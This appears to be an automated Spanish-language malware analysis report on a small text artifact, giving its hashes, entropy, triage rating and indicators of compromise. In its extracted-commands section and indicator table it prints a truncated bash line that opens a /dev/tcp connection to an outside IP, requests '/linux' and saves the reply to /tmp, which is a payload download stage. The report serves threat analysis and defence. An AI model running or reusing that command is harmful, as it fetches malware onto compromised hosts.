# 🧬 Payload Analysis

`a2bb48d37a81837869842437dc5730ad3bb9bfe2fd1a2f42b7b3474fee1036a5`

## 📌 Resumen

Artefacto de 573 B. Formato identificado como ASCII text, with very long lines (571), with CRLF line terminators. Entropía registrada: 5.76. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 3 indicadores técnicos.


## 🏷️ Clasificación

- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:34:59.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `a2bb48d37a81837869842437dc5730ad3bb9bfe2fd1a2f42b7b3474fee1036a5`
- **SHA1:** `7b23ee5e666bd919dbe51ae9b4f55adc6a98aabe`
- **MD5:** `2c370f6ca23ec3bd1689becd7fb4e41f`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (571), with CRLF line terminators |
| Tamaño | 573 B |
| Entropía | 5.76 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Ejecución**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with very long lines (571), with CRLF line terminators; iocs=3

## 🖥️ Comandos observados / extraídos

```text
system.exec "bash -c \"exec 6<>/dev/tcp/8.145.34.XXX/60106 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/SCUxMcvnJ3 &&
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 8.145.34.XXX | static_analysis |
| command | system.exec "bash -c \"exec 6<>/dev/tcp/8.145.34.XXX/60106 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/SCUxMcvnJ3 && | strings |
| hash | a2bb48d37a81837869842437dc5730ad3bb9bfe2fd1a2f42b7b3474fee1036a5 | static_analysis |
| ip | 101.126.159.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
